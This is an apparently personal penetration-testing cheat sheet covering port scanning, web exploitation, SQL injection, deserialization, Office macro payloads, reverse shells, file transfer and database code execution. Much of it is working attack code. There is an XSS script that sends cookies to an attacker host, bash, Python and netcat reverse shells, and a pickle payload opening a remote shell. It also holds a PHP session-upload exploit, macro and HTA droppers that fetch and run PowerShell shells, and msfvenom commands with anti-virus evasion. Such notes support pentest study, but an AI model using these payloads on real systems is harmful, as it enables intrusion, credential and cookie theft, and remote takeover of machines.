# My Security Resources
- 來幫我按星星啦 Q__Q 
    - https://github.com/stevenyu113228/My-Security-Resources

---
[TOC]

## Scan
### Portscan
- nmap
    - Static Binary
        - https://github.com/ernw/static-toolbox/releases
        - https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/nmap.exe
    - Parameters
        - `-A` : Enable OS detection, version detection, script scanning, and traceroute
        - `-p-` : Scan all ports
        - `-p 1000-9999` : Scan port from 1000 to 9999 
        - `-sV` : Services version
        - `-Pn` : No ping
        - `--script=vuln` : Scan vulnerability
        - `-p139,445` : Only scan 139,445 port
        - `-sn` : Host ping scan
        - `--source-port 4444` : use source port 4444 to scan 
    - Fast UDP Scan
        - `sudo nmap -sUV -T4 -F --version-intensity 0 {IP}`
- RustScan
	- `rustscan -a 10.10.166.15`
	    - `-r 1-65535` : Port range from 1 to 65535
## Web
### Scan
- [Dirsearch](https://github.com/maurosoria/dirsearch)
- [Githack-python3](https://github.com/tigert1998/GitHack-py3)
- [FFUF](https://github.com/ffuf/ffuf)
    - Fuzz sub-domain
        - `ffuf -c -w /usr/share/dnsrecon/subdomains-top1mil-20000.txt -u http://{domain.name}/ -H "Host: FUZZ.{domain.name}" -fs {normal_size}`
        - Wordlist
            - https://github.com/danTaler/WordLists/blob/master/Subdomain.txt
            - `/usr/share/dnsrecon/subdomains-top1mil.txt`
    - Get Parameter
        - https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
### Front-End
#### XSS
- Cheatsheet
    - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- Steal Cookie
	- `<script>new Image().src="http://{my_ip}:1234/"+document.cookie</script>`
	- `nc -l 1234`
- JQuery
```
$(`h2:contains("<img src=1 onerror=alert(1)>"`)
$(`h2:contains(""<img src=1 onerror=alert(1)>`)
```
- Angular JS
    - `{{constructor.constructor('alert(1)')()}}`
- JS feature
    - `"<><meow>".replace("<",1).replace(">",2)` = `12<meow>`
        - Replace only apply first match 

#### CSRF
- POST
```html
<form id="myForm" name="myForm" action="/change_pass.php" method="POST">
<input type=hidden name="password" id="password" value="meowmeow"/>
<input type=hidden name="confirm_password" id="confirm_password" value="meowmeow"/>
<input type=hidden name="submit" id="submit" value="submit"/>
<script>document.createElement('form').submit.call(document.getElementById('myForm'))</script>
```

- Get CSRF Token Before POST
```javascript
function post_data(csrf_token){
    var xhr = new XMLHttpRequest();
    xhr.open("POST", '/my-account/change-email', true);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send("email=meow%40meow.meow&csrf="+csrf_token);
}

function get_csrf() {
    var re = /[A-Za-z0-9]{32}/g;
    csrf_token = this.responseText.match(re)[0];
    post_data(csrf_token);
}

var get_csrf_request = new XMLHttpRequest();
get_csrf_request.addEventListener("load", get_csrf);
get_csrf_request.open("GET", "https://xxx/my-account");
get_csrf_request.send();
```

### Server
#### Apache
- Default log path
    - `/var/log/apache2/access.log`
- Shell Shock
    - Exist some path like `/cgi-bin/*.sh`
        - `dirsearch.py -u http://{IP}/cgi-bin  -e cgi`
    - Add `() { :;}; echo; /usr/bin/id` to User-Agent
        - Must use Absolute path
        - `User-Agent: (){ :; }; /bin/ping -c 1 {MY_IP}`
        - `USer-Agent: () { :; }; /usr/bin/nslookup $(whoami).meow.org`
            - DNS Only
    - nmap test
        - `nmap {IP} -p {PORT} --script=http-shellshock --script-args uri=/cgi-bin/{FILE_NAME}.cgi`
- Default config path
    - `/etc/httpd/conf/httpd.conf`
#### Nginx
#### IIS
- Default web root path
    - `C:\inetpub\wwwroot`
- IIS 6.0
    - [CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)
        - Can only run once!!
#### Tomcat
- Tomcat Path
    - `/manager/status/all`
    - `/admin/dashboard`
- Path Bypass
    - With `/..;/`
        - e.g. `/manager/status/..;/html/upload`
### PHP
- Bypass `system`
	- `echo passthru("whoami")`
	- `echo shell_exec("whoami")` 
	- `echo exec("whoami")`
- Check disable function
    - `phpinfo();`
    - `<?php var_dump(ini_get('disable_functions'));`
- Bypass Disable Function
    - https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php
- Wrapper
	- `php://filter/convert.base64-encode/resource=meow.php`
- Default Session Path
    - `/var/lib/php/sessions/sess_{sess_name}`
- LFI PHP_SESSION_UPLOAD_PROGRESS (From Splitline)
    ```python
    import grequests
    sess_name = 'meowmeow'
    sess_path = f'/var/lib/php/sessions/sess_{sess_name}'
    # sess_path = f'/var/lib/php/session/sess_{sess_name}'
    # sess_path = f'/tmp/sess_{sess_name}'
    base_url = 'http://{target-domain}/{target-path/randylogs.php}'
    param = "file"

    # code = "file_put_contents('/tmp/shell.php','<?php system($_GET[a])');"
    code = '''system("bash -c 'bash -i >& /dev/tcp/{domain}/{port} 0>&1'");'''

    while True:
        req = [grequests.post(base_url,
                              files={'f': "A"*0xffff},
                              data={'PHP_SESSION_UPLOAD_PROGRESS': f"pwned:<?php {code} ?>"},
                              cookies={'PHPSESSID': sess_name}),
               grequests.get(f"{base_url}?{param}={sess_path}")]

        result = grequests.map(req)
        if "pwned" in result[1].text:
            print(result[1].text)
            break
    ```
    - [File extension](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
- XXE
    ```javascript=
    var xml = '' +
        '<?xml version="1.0" encoding="UTF-8"?>\n' +
        '<!DOCTYPE a [ <!ENTITY b SYSTEM "file:///etc/passwd"> ]>\n' +
        '<root>' +
        '<name>' + "0" + '</name>' +
        '<search>' + "&b;" + '</search>' +
        '</root>';
    ```
### JSP / Tomcat
- Webshell
    - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp
        - `jar -cvf cmd.war cmd.jsp` and upload to Tomcat admin
- Brute force
    - hydra : `hydra -L  /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt -f {IP} -s {PORT} http-get /manager/html`
    - msf : `scanner/http/tomcat_mgr_login`
### Django 
- `manage.py`
    - `{appname}`
        - `settings.py`
            - INSTALLED_APPS
            - DATABASES
        - `urls.py`
            - urlpatterns
        - `views`
            - `{URL Urlpattern's class}`
### Werkzeug
- Debug Page RCE
    - https://github.com/its-arun/Werkzeug-Debug-RCE
### Defence
- Knockd
	- `/etc/knockd.conf`
	- `nc` port several time to knock
### Web Shell
- PHP
	- [b374k](https://github.com/b374k/b374k)
	- [windows-php-reverse-shell](https://github.com/Dhayalanb/windows-php-reverse-shell)
- ASPX
	- https://raw.githubusercontent.com/SecWiki/WebShell-2/master/Aspx/awen%20asp.net%20webshell.aspx
	- https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
- Adminer (SQLadmin)
    - https://www.adminer.org/
### SSTI
#### ERB (Ruby)
- Test
    - `<%= 7 * 7 %>`
- RCE
    - `<%= system("whoami") %>`

#### Tornado (Python)
- Test
    - `{{7*7}}`
- RCE
    - `{% import os %}{{os.popen("whoami").read()}}`

#### Freemarker (Java)
- Test
    - `${7*7}`
- RCE
    - `${"freemarker.template.utility.Execute"?new()("whoami")}`
- Read file from sandbox
    - `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}`
        - Use Cyberchef "From Decimal" to decode 
#### Handlebars (NodeJS)
- RCE
    ```
    {{#with "s" as |string|}}
      {{#with "e"}}
        {{#with split as |conslist|}}
          {{this.pop}}
          {{this.push (lookup string.sub "constructor")}}
          {{this.pop}}
          {{#with string.split as |codelist|}}
            {{this.pop}}
            {{this.push "return require('child_process').exec('id');"}}
            {{this.pop}}
            {{#each conslist}}
              {{#with (string.sub.apply 0 codelist)}}
                {{this}}
              {{/with}}
            {{/each}}
          {{/with}}
        {{/with}}
      {{/with}}
    {{/with}}
    ```
#### Pug (NodeJS)
Bypass keyword blacklist
```
#{function(){eval(`localLoad=global.process.mainModule.constructor._load;sh=localLoad('child`+`_process').exec('ncat 10.10.10.10 7777 -e /bin/bash')`)}()}
```
#### Jinja2 (Python)
- For flask, Django ......
- Secret key
    - `{{settings.SECRET_KEY}}`

### Unserialize
#### Python
```python=
import subprocess
import pickle

class Meow(object):
    def __reduce__(self):
        return subprocess.check_output, (['ping', '-c', '1', '10.10.10.10'], )

a = Meow() #
print(base64.b64encode(pickle.dumps(a)))


class Meow(object):
    def __reduce__(self):
        return os.system, ("bash -c 'bash -i >& /dev/tcp/192.168.119.130/7877 0>&1'",)

payload = pickle.dumps(Meow())
payload = base64.b64encode(payload).decode()

```

#### ASP.Net
##### Json.Net
```
.\ysoserial.exe -g  ObjectDataProvider -f Json.Net -c 'ping {My_IP}'
```
- Limitation : In `JsonConvert.DeserializeObject`, the `TypeNameHandling` in configuration `JsonSerializerSettings` must not be `None`, can be `Objects`, `Arrays`, `All`, `Auto`

### Java
- String start with
    - `\xac\xed\x00\x05` or Base64 (`rO0AB`) 
- ysoserial
    - https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
```dockerfile
FROM openjdk:11.0.16
COPY ysoserial-all.jar /root/ysoserial-all.jar

ENTRYPOINT ["java", "-jar", "/root/ysoserial-all.jar"]
# docker build . -t ysoserial:meow
```
- PoC
    - `docker run --rm ysoserial:meow CommonsCollections3 'touch /tmp/meow'`
- Reverse shell
    - `docker run --rm ysoserial:meow CommonsCollections3 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zNS43NC42Ny4xOS82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}'`
    - Note that don't add `-it` in docker
### CMS
#### Wordpress
- WPScan
    - `wpscan --url {URL} --enumerate p,t,u --plugins-detection aggressive -t 30`
        - enumerate
            - p : plugin
            - t : theme
            - u : users
        - t : thread
    - `wpscan --url {url} --usernames {username} --passwords {password_file} -t 30`
- Enum user
    - `http://{ip}/index.php/?author=1`
- plugins path
    - `/wp-content/plugins/{plugin_name}`
- Password db
    - `SELECT concat(user_login,":",user_pass) FROM wp_users;`
- Config file (DB Pass)
    - `wp-config.php`
- Plugin Webshell
    - `wget https://raw.githubusercontent.com/jckhmr/simpletools/master/wonderfulwebshell/wonderfulwebshell.php`
    - `zip wonderfulwebshell.zip wonderfulwebshell.php`
    - Upload and Enable
    - `http://{doamin}/wp-content/plugins/wonderfulwebshell/wonderfulwebshell.php?cmd=ls`
### MySQL injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet
#### SQL Command
- Limit
    - `LIMIT 0,1` , `LIMIT 1,1` , `LIMIT 2,1` ...
        - Select only 1 data
    - `LIMIT 1 OFFSET 0`, `LIMIT 1 OFFSET 1`
- Substring
    - `SUBSTRING("ABC",1,1)`
        - Will return `A`
    - `SUBSTRING("ABC",2,1)`
        - Will return `B`
- ASCII
    - `ASCII("A")`
        - Will Return `65`
- Concat
    - `concat(1,':',2)`
        - Will return `1:2`
- Group concat
    - `group_concat()`
    - Concatenate multiple data to one line string
- String Length
    - `length()`
- Row counts
    - `count()`
- Current db
    - `database()`
- Distinct item
    - `distinct()`
#### Dump Data
- DB name
    - `select schema_name from information_schema.schemata`
- Table name
    - `select table_name from information_schema.tables where table_schema='{db_name}'`
- Column name
    - `select column_name from information_schema.columns where table_name='{table_name}' and table_schema='{db_name}'`
- Select data
    - `select concat({username},':',{password}) from {db_name}.{table_name}`
- Mysql User and hash
    - `select concat(user,':',password) from mysql.user`
- Command dump
    - `mysqldump -u {username} -h localhost -p {dbname}  > a.sql`
        - `--all-databases`
#### File
- Write file
    - `SELECT "meow" INTO OUTFILE "/tmp/a";`
### PostgreSQL injection
- Current 
    - db
        - `current_database()`
    - schema
        - `current_schema` (without `()`)
- DB names
    - `SELECT datname FROM pg_database`
- Schema names
    - `SELECT schemaname FROM pg_tables`
- Table names
    - `SELECT tablename FROM pg_tables WHERE schemaname='{schemaname}'`
- Column name
    - `SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' and table_schema='{schema name}'`
- Select Data
    - `SELECT {column} FROM {SCHEMA}.{TABLE}`
- Conditional time delays
    - `SELECT CASE WHEN ({condition}) THEN pg_sleep(10) ELSE pg_sleep(0) END`
- Order By
    - `... ORDER BY (CASE WHEN 1=0 THEN id ELSE length(name) END)`
### MSSQL injection
#### SQL Command
- `SELECT quotename({col_name}) FROM {DB} FOR XML PATH('')`
    - Like `group_concate` in MySQL
- `SELECT TOP 1 {COL_NAME} FROM {TABLE}`
    - `SELECT TOP 1 {COL_NAME} FROM {TABLE} WHERE {COL_NAME} NOT IN ('A','B')` 
- `SELECT {COL_NAME} FROM {DB_NAME}.dbo.{TABLE}`
    - Select other DB
- `CONVERT(int,{command})`
    - Error based
- Concatenation String
    - `'aaa'+'bbb'`
- String length
    - `LEN()`
- Current DB
    - `db_name()`
#### Dump DB Name
- `DB_NAME({NUM})`
    - NUM start from 1
- `SELECT name FROM master ..sysdatabases`
- `SELECT name FROM master.dbo.sysdatabases`
- One line
    - `SELECT quotename(name) FROM master.dbo.sysdatabases FOR XML PATH('')`

#### Dump Table name
- One line 
    - `SELECT quotename(name) FROM {DB_NAME}..sysobjects where xtype='U' FOR XML PATH('')`
- Select One Data
    - `SELECT TOP 1 name,NULL FROM music..sysobjects where xtype='U'`
        - `and name not in ('Table_1','Table_2')`
#### Dump column name
- One line
    - `SELECT quotename(name) FROM {DB_NAME}..syscolumns WHERE id=(SELECT id FROM {DB_NAME}..sysobjects WHERE name='{TABLE_NAME}') FOR XML PATH('')))) -- -`
- Select One Data
    - `SELECT column_name FROM information_schema.columns WHERE table_catalog='{DB NAME}' AND table_name='{TABLE_NAME}'`
#### DB Admin
- `select concat(user,',',password),NULL from master.dbo.syslogins -- -`
### Oracle Injection
- Concatenation String
    - `'aaa'||'bbb'`
- Sub string
    - `SUBSTR('ABC',1,1)`
        - Return `A`
    - `SUBSTR('ABC',2,1)`
        - Return `B`
- Union based
    - Column counts, Data type must be same (`NULL`)
    - Select must have `FROM`, if no item can FROM, use `dual`
    - eg. `' UNION SELECT NULL,NULL,3 FROM dual --`
- Current Username
    - `SELECT USER FROM dual`
- Dump DB (Schema) Names
    - `SELECT DISTINCT OWNER FROM ALL_TABLES` (return multiple rows)
    - Common (Normal DB) : `APEX_040200`, `MDSYS`, `SEQUELIZE`, `OUTLN`, `CTXSYS`, `OLAPSYS`, `FLOWS_FILES`, `SYSTEM`, `DVSYS`, `AUDSYS`, `DBSNMP`, `GSMADMIN_INTERNAL`, `OJVMSYS`, `ORDSYS`, `APPQOSSYS`, `XDB`, `ORDDATA`, `SYS`, `WMSYS`, `LBACSYS`
        - But data may in `SYSTEM` or other existing DB
- Dump Table Names
    - All : `SELECT OWNER,TABLE_NAME FROM ALL_TABLES`
    - Specific DB: `SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='{DB_NAME}'`
- Dump Column Names
    - `SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='{TABLE_NAME}'`
- Select data
    - `SELECT {Col1},{Col2} FROM {Table}`
- Select One line using ROWNUM (Doesn't support limit)
    - eg. `SELECT NULL,COLUMN_NAME,3 FROM (SELECT ROWNUM no, TABLE_NAME, COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='WEB_ADMINS') where no=1 -- ` 
        - no=1 2 3 ...
- DB Version
    - `select version from V$INSTANCE`
    - `select BANNER from v$version`
- Error Based
    - ` SELECT CASE WHEN ({condition}) THEN NULL ELSE to_char(1/0) END FROM dual `
- Current DB
    - `SELECT SYS.DATABASE_NAME FROM dual`
### SQLite Injection
- Version
    - `sqlite_version()`
- Table
    - `select name from sqlite_master WHERE type='table'`
- Column
    - `select sql from sqlite_master WHERE type='table'`
- Data
    - `select {Column} from {Table}`
### SSRF
- Localhost
    - `localhost`
    - `127.0.0.1`, `127.0.0.255`, `127.255.254.255`
### Linux 
- Current process
    - `/proc/self/cmdline`
### Web Socket
```python
# pip install websocket-client
from websocket import create_connection
ws = create_connection("ws://xxx.xxx.xxx.xxx/xxxx")
print(ws.recv())
ws.send("meow")
```
### Remote Debugger
#### Python
- Remote
    - `pip install ptvsd`
- Add following code in source code
```python=
import ptvsd
ptvsd.enable_attach(redirect_output=True)
ptvsd.wait_for_attach()
```
- Rsync code to local
    - `rsync -avh -e 'ssh -i xxx.pem' ubuntu@10.10.10.10:django`
- VSCode Auto generate Remote Attach
    - Modify `connect`, `pathMappings`
#### Java Jar JDB
- Remote
    - `java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=0.0.0.0:9999 -jar file.jar`
- Local
    - `rlwrap jdb -attach {IP}:{Port}`
- Command
    - Breakpoint
        - `stop in {com.example.servingwebcontent.classname}.{function name}`
        - `stop in {com.example.servingwebcontent.classname}:{Line Number}` (JD-gui)
    - Show variable
        - `locals` 
    - Set variable
        - `set var=value`
    - Step
        - `step` next line (into function)
        - `stepi` next line 
        - `cont` continue
#### Node.js
- Rsync copy code
- `node --inspect=0.0.0.0:9229 target.js`
    - VSCode auto generate launch.json

#### .Net dnSpy
- Backup DLL first
- Right click DLL
    - Edit Assembly Attribute
    - edit`[assembly: Debuggable .....]`) into
        ```
        [assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default |
            DebuggableAttribute.DebuggingModes.DisableOptimizations | 
            DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints |
            DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
        ```
    - Compile, File-> Save Module
- Debug -> Attach to Process
    - `w3wp.exe`
- Debug -> Windows -> Modules
    - Find the DLL
## Client Side Attack
### Office Macro
- File type : `docm` or `doc`, doesn't support `docx`
- Open cmd when start
    ```vba
    Sub AutoOpen()
        MyMacro
    End Sub
    Sub Document_Open()
        MyMacro
    End Sub
    Sub MyMacro()
        Dim str As String
        str = "cmd /c whoami && pause"
        CreateObject("Wscript.Shell").Run str
    End Sub
    ```
    - cmd path will at `system32`
    - shell : `str = powershell iex (New-Object Net.WebClient).DownloadString('http://{IP}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {PORT}`
- Reverse shell 1
    - `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT=443 -e x86/shikata_ga_nai -f vba > shell.vba`
        - First Half to macro
        - Second Half to word doc
- Reverse shell 2 (macro_pack)
    - `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.247 LPORT=443 -e x86/shikata_ga_nai -f vba > shell.vba`
    - [macro_pack](https://github.com/sevagas/macro_pack)
    - `macro_pack.exe -f shell.vba -o -G meow.doc`
### HTA (HTML Application)
- VBS RCE
    - ` <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.119.132/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.132 -Port 53"</scRipt>`
## Shell
### Linux Shell
- Find File
    - `find  / -iname {file_name} -print 2>/dev/null`
	- `du -a 2>/dev/null | grep {file_name}`
	- `tar cf - $PWD 2>/dev/null | tar tvf - | grep {file_name}`
### Windows Shell
- List all data
	- `dir /a`
	- `gci -recurse | select fullname` (Powershell)
- Short name
	- `dir /x` 
- Find File
    - `dir {file_name} /s /p`
### Reverse Shell - Linux
- Prepare
	- `nc -nvlp {port}`
	- `nc -vlk {port}`
	- `rlwrap nc -nvlp`
		- Support left and right
- https://reverse-shell.sh/
- [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- Bash tcp
    - `bash -c 'bash -i >& /dev/tcp/my_ip/7877 0>&1'`
    	- Write file in local first, and use wget/curl to get to victim machine
    	- `/usr/bin/wget -O - {ip:port}/{file} | /bin/bash`
    - `bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261%27`
- Nc
    - `nc {IP} {Port} -e /bin/bash`
- Python
    - `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' &`
- Make it more interactively
    - `python -c 'import pty; pty.spawn("/bin/bash")'`
    - `perl -e 'exec "/bin/bash";'`
- Full shell (Can use vim)
    - `bash` (Zsh doesn't support)
    - `nc -nlvp 443` (Open Port to listening, and wait shell to conect)
    - `python -c 'import pty; pty.spawn("/bin/bash")'` (Spawn shell)
    - Ctrl + Z
    - `stty raw -echo`
    - `fg` (Will not show)
    - `reset`
    - Enter , Enter
    - Ctrl + C
    - `export SHELL=bash`
    - `export TERM=xterm-256color`
    - `stty rows 38 columns 116`
- js Shell Code
    - `
    msfvenom -p linux/x86/shell_reverse_tcp LHOST={IP} LPORT={Port} CMD=/bin/bash -f js_le -e generic/none`
- [socat](https://github.com/ernw/static-toolbox/releases/download/socat-v1.7.4.1/socat-1.7.4.1-x86)
    - Server : ```socat file:`tty`,raw,echo=0 tcp-listen:{PORT}```
    - Client : `./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{IP}:{PORT}`
- Reverse SSH
    - https://github.com/Fahrj/reverse-ssh
### Reverse Shell - Windows
- msfvenom
	- https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
	    - stage : `shell/reverse_tcp`
	        - msf `multi/handler` to receive
	    - stageless : `shell_reverse_tcp`
	        - `nc` to receive
	- aspx
		- `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT}  -f aspx > shell.aspx`
		- `msfvenom -p windows/shell/reverse_tcp LHOST={IP} LPORT={PORT}  -f aspx > shell.aspx`
	- exe
		- `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell-x86.exe`
		- `msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -e x86/shikata_ga_nai -f exe > shell.exe`
			- Anti-Anti-virus
        - `msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT}  -f exe -o shellx64.exe`
            - Most of time, x64 system can also run x86 shell
    - msi
        - `msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={Port} -f msi -o shellx64.msi`
            - Install by `msiexec /quiet /i shellx64.msi`

- Powershell
	- [Invoke-PowerShellTcp](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)
	    - `powershell iex (New-Object Net.WebClient).DownloadString('http://{my_ip}:{http_port}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {my_ip} -Port {shell_port}`
	    - Add `Invoke-PowerShellTcp -Reverse -IPAddress {IP} -Port {Port}` in the last line, and `powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.35/Invoke-PowerShellTcp1.ps1')`
    - [mini-reverse.ps1](https://gist.github.com/Serizao/6a63f35715a8219be6b97da3e51567e7/raw/f4283f758fb720c2fe263b8f7696b896c9984fcf/mini-reverse.ps1)
        - `powershell IEX (New-Object Net.WebClient).DownloadString('http://10.1.1.246/mini-reverse.ps1')`
### File Transmission - Linux
- SCP
- HTTP
	- Prepare
		- `python3 -m http.server`
			- use `sudo` to `get` 80 port
	- GET
		- `wget {my_ip}:{port}/{file_name} -O {path_to_output}`
		- `curl -o {path_to_output} http`
- NC
	- Prepare
		- `nc -l -p {attacker_port} > {file}`
	- Send
		- `nc {attacker_ip} {attacker_port} < {file}`
		- `cat {file} > /dev/tcp/{ip}/{port}`
    - TCP
        - `nc -nlvp {Port} < {file}`
        - `cat<'/dev/tcp/{IP}/{Port}' > {file}`
- FTP
    - `python3 -m pyftpdlib -p 21 -w`
### File Transmission - Windows
- HTTP
	- Prepare
		- `python3 -m http.server`
	- GET (Powershell)
		- `wget` , `curl` , `iwr` is alias for `Invoke-WebRequest`
			- `Invoke-WebRequest http://{my_ip}:{my_port}/{file} -outFile {file_name}`
			    - `-UseBasicParsing`
        - `certutil -urlcache -f {URL} {File_name}`
- SMB
	- `impacket-smbserver meow .`
		- In Kali
		- `-smb2support`
	- `copy \\{IP}\meow\{filename} {filename}`
		- In Windows
    - `net view {IP}`
        - Show shares
- Pack file
	- cab
		- `lcab -r {dir} {file.cab}`
			- In kali
		- `expand {file.cab} -F:* {Extract path}`
			- Extract path must be absolute path like `C:\Windows\Temp`
- https://blog.ropnop.com/transferring-files-from-kali-to-windows/
## Server
### Redis
- Write shell / file
	- `redis-cli -h {ip} `
		- Connect
	- `config set dir "/var/www/html"`
		- Set dir
	- `config set dbfilename meow.php`
		- Set file name
	- `set x "\r\n\r\n<?php system($_GET[A]);?>\r\n\r\n"`
		- Write web shell
	- `save`
		- Save file
### MySQL
#### Exploit
- User-Defined Function (UDF) Dynamic Library
    - `SHOW VARIABLES LIKE 'plugin_dir';`
        - Check plugin dir
    - Write File Method (1)
        - `use mysql;`
        - `create table hack(line blob);`
        - `insert into hack values(load_file('/tmp/lib_sys_udf.so'));`
            - File From https://github.com/zinzloun/MySQL-UDF-PrivEsc (https://www.exploit-db.com/exploits/1518)
        - `select * from hack into dumpfile '/{plugin_dir}/lib_sys_udf.so';`
    - Write File Method (2)
        - `xxd -p -c 9999999 lib_sys_udf.so`
        - `SET @SHELL=0x{.....}`
        - `SHOW VARIABLES LIKE 'plugin_dir';`
        - `SELECT BINARY @SHELL INTO DUMPFILE '{PLUGIN_DIR}/meow.so';`
    - `create function do_system returns integer soname 'lib_sys_udf.so';`
    - `select do_system("{Bash script}");`
        - Not show return 
#### Logging
- Conf File
    - `/etc/my.cnf.d/mysql-server.cnf` (Centos)
    - `/etc/mysql/my.cnf` (Debian)
- Add 2 line
    - `general_log_file=/var/log/mysql/mysql_log.log`
    - `general_log=1`
- Restart services
    - `sudo systemctl restart mysqld`
- See Log
    - `tail -f /var/log/mysql/mysql_log.log`
### MSSQL
- Connect
	- `impacket-mssqlclient -p {port} {UserID}@{IP} -windows-auth`
	- Default port : 1433
- Shell
	- `exec xp_cmdshell '{Command}'`
	    - `exec xp_cmdshell '\\192.168.119.210\meow\s443.exe'`
	        - `exec` doesn't need escape character
            - `xp_cmdshell(net users)`
                - Can also work but can't `\`
	- If no permission
        ```
        EXEC sp_configure 'show advanced options',1
        RECONFIGURE 
        EXEC sp_configure 'xp_cmdshell',1
        RECONFIGURE
        ```
#### Backup
- `C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup/master.mdf`
    - Or short path `C:/PROGRA~1/MICROS~1/MSSQL1~1.SQL/MSSQL/Backup/master.mdf`
- [Invoke-MDFHashes](https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes)
    - `Add-Type -Path 'OrcaMDF.RawCore.dll'`
    - `Add-Type -Path 'OrcaMDF.Framework.dll'`
    - `import-module .\Get-MDFHashes.ps1`
    - `Get-MDFHashes -mdf "C:\Users\Administrator\Desktop\master.mdf" | Format-List`
    - Use john
### Oracle
- Default Port 1521
- Check version
    - `nmap --script "oracle-tns-version" -p 1521 -T4 -sV {IP}`
- Brute Force SID
    - `hydra -L sids-oracle.txt -s 1521 {IP} oracle-sid`
    - [oracle-sid.txt](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-LcreDSG0Hi8mv8n8DIw%2F-LcrnYv40ILvFrpjKRkb%2Fsids-oracle.txt?alt=media&token=8206a9f6-af86-4a49-ac71-179ca973d836)
    - `odat sidguesser -s "{IP}" -p 1521`
- Connection
    - `tnscmd10g status --10G -p {port} -h {IP}`
- [ODAT](https://github.com/quentinhardy/odat/releases)
- Brute Force Username and Password
    - `./odat all -s {IP} -p {PORT} -d {SID}`
        - `--accounts-file` 
    - `patator oracle_login sid={SID} host={IP} user=FILE0 password=FILE1 0=~/Wordlist/users-oracle.txt 1=~/Wordlist/pass-oracle.txt`
    - `odat all -s 10.11.1.222 -p 1521 -d XEXDB`
- RCE
    - `odat-libc2.12-x86_64 ./odat-libc2.12-x86_64 dbmsscheduler -U {Username} -P {Password} -d {SID} -s {IP} --sysdba --exec "{command}" `
### PostgreSQL
#### Log
- `/etc/postgresql/{version}/main/postgresql.conf`
    - `log_statement = 'all'`
- `systemctl restart postgresql`
- `tail -f /var/log/postgresql/postgresql-10-main.log`
#### UDF
- https://github.com/martinvw/pg_exec/tree/master/libraries
- Download `.so` file
- Put them into `/tmp/pg_exec.so`
```python=
def do_query(command):
    pass # implement by yourself
loid = 1234
def delete_lo():
    command = f"SELECT lo_unlink({loid})"
    do_query(command)
delete_lo()

def create_lo():
    command = f"SELECT lo_create({loid});"
    do_query(command)
create_lo()

pg_exec_binary = open("pg_exec.so",'rb').read()
udf = pg_exec_binary.hex()
def inject_udf():
    for i in range(0,int(round(len(udf)/4096))+1): # Done
        udf_chunk = udf[i*4096:(i+1)*4096]
        if len(udf_chunk) == 4096:
            sql = f"INSERT INTO pg_largeobject (loid, pageno, data) values ({loid}, {i}, decode('{udf_chunk}', 'hex'))"
            do_query(sql)
inject_udf()

def lo_export():
    command = "SELECT lo_export(1234,'/tmp/pg_exec.so');"
    do_query(command)
lo_export()
```
- `CREATE FUNCTION sys(cstring) RETURNS int as '/tmp/pg_exec.so', 'pg_exec' LANGUAGE 'c' STRICT;`
- `SELECT sys($$bash -c "bash -i >& /dev/tcp/10.10.10.10/7777 0>&1"$$);`
### SMB
- smb to shell
    - `winexe -U '{username}' //{ip} cmd.exe`
    - `impacket-smbexec '{username}:{password}'@{ip}`
